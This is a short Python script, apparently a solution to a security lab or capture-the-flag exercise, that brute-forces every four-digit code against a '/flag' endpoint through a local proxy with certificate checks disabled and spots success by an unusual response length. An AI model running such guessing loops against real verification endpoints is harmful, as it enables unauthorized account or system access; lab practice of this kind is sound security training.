import requests
import re

#Proxied through browser with mTLS certificate
proxies = {
  'https': 'http://127.0.0.1:8080',
}

#declutter console output by supressing warnings about mTLS certificate
requests.packages.urllib3.disable_warnings() 

#application requires this header
headers = {
"Host": "quoccaair-ff.quoccacorp.com"
  }


for code in range(10000):
    
    print("Trying code: ",code,end="\r")

    #Send a request with the code
    r = requests.post("https://quoccaair-ff.quoccacorp.com/flag", 
                      headers=headers,data={"code":code},proxies=proxies, verify=False)
    
    print(" "*80,end="")

    #The content length for an incorrect code was found to always be 511.
    #A successful code, once found will have a different content length.
    if r.headers["Content-Length"] != '511':
        print("Found using code:", code)
        break
    

